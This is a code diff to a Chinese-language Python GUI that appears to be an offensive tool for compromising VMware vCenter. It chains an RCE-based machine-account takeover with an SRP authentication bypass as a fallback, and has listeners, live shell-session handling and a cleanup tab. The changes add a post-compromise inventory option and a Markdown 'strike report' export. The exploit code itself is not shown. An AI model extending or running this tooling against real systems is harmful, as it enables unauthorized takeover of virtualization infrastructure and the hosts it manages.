@@ -1005,13 +1005,16 @@ class ToolApp:
                 return
             self.log("[+] %s" % r.msg, "+")
             info = r.info
-            self.v590_info.delete("1.0", "end")
-            self.v590_info.insert("1.0",
-                                  "身份: %s\nN: %d bit\n服务端选项: %s\n"
-                                  "客户端选项: %s\n安全层: %s" %
-                                  (info["identity"], info["N_bits"],
-                                   info["server_options"], info["client_options"],
-                                   info["layer"]))
+            text = ("身份: %s\nN: %d bit\n服务端选项: %s\n"
+                    "客户端选项: %s\n安全层: %s" %
+                    (info["identity"], info["N_bits"],
+                     info["server_options"], info["client_options"],
+                     info["layer"]))
+
+            def _show(text=text):
+                self.v590_info.delete("1.0", "end")
+                self.v590_info.insert("1.0", text)
+            self.root.after(0, _show)
             try:
                 conn.send_op(op_search("", scope=0, attrs=["namingContexts"]))
                 entries, _ = collect_search(conn)
@@ -1322,10 +1325,6 @@ class ToolApp:
                 self.log("[!] 无法监听 %d: %s" % (port, e), "!")
         self.run_bg(work, "监听")
 
-    def _on_new_session(self, sess):
-        # 会话入表由 _poll_sessions 刷新，日志由 SessionManager 统一记录
-        return
-
     def _poll_term(self):
         """实时流：当前会话的原始输出直接上屏（ANSI 颜色码已剥离）。"""
         try:
@@ -1569,10 +1568,13 @@ class ToolApp:
         cf.pack(fill="x", pady=4)
         self.vch_use10 = tk.BooleanVar(value=True)
         self.vch_use09 = tk.BooleanVar(value=True)
+        self.vch_inv = tk.BooleanVar(value=True)
         ttk.Checkbutton(cf, text="路径 A：59310 RCE → 机器账户接管（首选）",
                         variable=self.vch_use10).pack(anchor="w", padx=6, pady=2)
         ttk.Checkbutton(cf, text="路径 B：59309 SRP 绕过（A 失败时降级）",
                         variable=self.vch_use09).pack(anchor="w", padx=6, pady=2)
+        ttk.Checkbutton(cf, text="交付后自动盘点（vSphere REST 只读清单）",
+                        variable=self.vch_inv).pack(anchor="w", padx=6, pady=2)
         ttk.Label(cf, text="SSO 域名自动从机器账户 DN 推导；59310 传输参数取自 ② 页。",
                   style="Muted.TLabel", wraplength=int(500 * self.S),
                   justify="left").pack(anchor="w", padx=6, pady=2)
@@ -1581,6 +1583,8 @@ class ToolApp:
         bf.pack(fill="x", pady=4)
         ttk.Button(bf, text="开始一键打通 [F7]", style="Acc.TButton",
                    command=self._chain_run).pack(fill="x", padx=4, pady=4)
+        ttk.Button(bf, text="导出测试报告（Markdown）", command=self._chain_report).pack(
+            fill="x", padx=4, pady=2)
         ttk.Button(bf, text="取消", command=self.stop_flag.set).pack(
             fill="x", padx=4, pady=2)
         nf = ttk.LabelFrame(left, text="流程")
@@ -1614,6 +1618,7 @@ class ToolApp:
         user = self.vch_user.get().strip() or None
         password = self.vch_pass.get().strip() or None
         use10, use09 = self.vch_use10.get(), self.vch_use09.get()
+        inv = self.vch_inv.get()
         try:
             vport = int(self.v510_vport.get() or 5480)
             port = int(self.v510_port.get() or 514)
@@ -1622,16 +1627,17 @@ class ToolApp:
             return
         proxy = self.http_proxy.get().strip() or None
         self.stop_flag.clear()
-        self.log("[*] 一键打通开始 → %s（路径A=%s 路径B=%s）"
-                 % (host, use10, use09), "i")
+        self.log("[*] 一键打通开始 → %s（路径A=%s 路径B=%s 盘点=%s）"
+                 % (host, use10, use09, inv), "i")
 
         def work():
             r = run_chain(host, user=user, password=password,
                           use_59310=use10, use_59309=use09,
                           syslog_port=port, proto=self.v510_proto.get().lower(),
-                          vami_port=vport, proxy=proxy,
+                          vami_port=vport, proxy=proxy, inventory=inv,
                           log=lambda s: self.log(s, "m"),
                           stop_flag=self.stop_flag)
+            self.chain_result = r
             card = r.card
 
             def _show():
@@ -1646,6 +1652,23 @@ class ToolApp:
             else:
                 self.log("[!] 一键打通未成功，各阶段明细见上方与日志", "!")
         self.run_bg(work, "一键打通")
+
+    def _chain_report(self):
+        r = getattr(self, "chain_result", None)
+        if not r:
+            messagebox.showinfo("提示", "先执行一次「开始一键打通」")
+            return
+        f = filedialog.asksaveasfilename(
+            defaultextension=".md",
+            initialfile="vc-strike-report-%s.md" % time.strftime("%Y%m%d-%H%M%S"))
+        if not f:
+            return
+        try:
+            with open(f, "w", encoding="utf-8") as fp:
+                fp.write(r.report_markdown())
+            self.log("[+] 测试报告已导出: %s" % f, "+")
+        except OSError as e:
+            self.log("[!] 报告导出失败: %s" % e, "!")
 
     # ================= Tab6 清理中心 =================
     def _build_tab_clean(self):
